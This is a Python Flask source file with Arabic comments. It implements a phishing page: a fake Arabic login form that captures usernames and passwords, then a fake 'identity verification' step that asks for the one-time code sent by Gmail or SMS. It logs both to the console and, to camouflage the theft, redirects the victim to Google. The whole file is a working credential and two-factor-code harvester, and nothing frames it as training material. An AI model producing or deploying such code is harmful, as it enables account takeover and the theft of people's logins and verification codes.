from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# --- CSS تصميم مطور وفنان ---
CSS_STYLE = """
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 350px; text-align: center; }
    .logo { font-size: 36px; font-weight: bold; margin-bottom: 30px; color: #333; letter-spacing: -1px; }
    .input-group { margin-bottom: 15px; }
    .input-group input { width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 8px; box-sizing: border-box; transition: 0.3s; }
    .input-group input:focus { border-color: #764ba2; outline: none; }
    .btn { background: linear-gradient(to right, #667eea, #764ba2); color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.3s; }
    .btn:hover { opacity: 0.9; transform: translateY(-2px); }
    h3 { color: #444; }
    p { color: #666; font-size: 14px; }
"""

# --- القالب 1: إدخال المستخدم والباسورد ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        {{ css | safe }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">تسجيل الدخول</div>
        <form method="post">
            <div class="input-group">
                <input type="text" name="username" placeholder="اسم المستخدم" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="كلمة المرور" required>
            </div>
            <button type="submit" class="btn">التالي</button>
        </form>
    </div>
</body>
</html>
"""

# --- القالب 2: طلب الكود (النص المحدث بدقة) ---
CODE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحقق من الهوية</title>
    <style>
        {{ css | safe }}
    </style>
</head>
<body>
    <div class="login-box">
        <h3>التحقق من الهوية</h3>
        <p>تم إرسال الرمز يرجى تاكد من جيميل او sms، يرجى إدخاله للمتابعة واذا لم يصلك اي رمز عبر جميمل او SMS بعد تاكد يرجى ضغط 0 لتخطي.</p>
        <form action="/verify" method="post">
            <input type="hidden" name="username" value="{{ username }}">
            <div class="input-group">
                <input type="text" name="code" placeholder="رمز الكود" required>
            </div>
            <button type="submit" class="btn">تفعيل</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"بيانات أولية -> المستخدم: {username} | الباس: {password}")
        
        # تمرير CSS والـ username للقالب
        return render_template_string(CODE_TEMPLATE, css=CSS_STYLE, username=username)
            
    # تمرير CSS للقالب
    return render_template_string(HTML_TEMPLATE, css=CSS_STYLE)

# --- صفحة 3: استقبال الكود وإعادة التوجيه (التمويه) ---
@app.route('/verify', methods=['POST'])
def verify():
    code = request.form.get('code')
    username = request.form.get('username')
    print(f"المستخدم: {username} | الكود: {code}")
    
    # إعادة التوجيه إلى موقع جوجل للتمويه
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)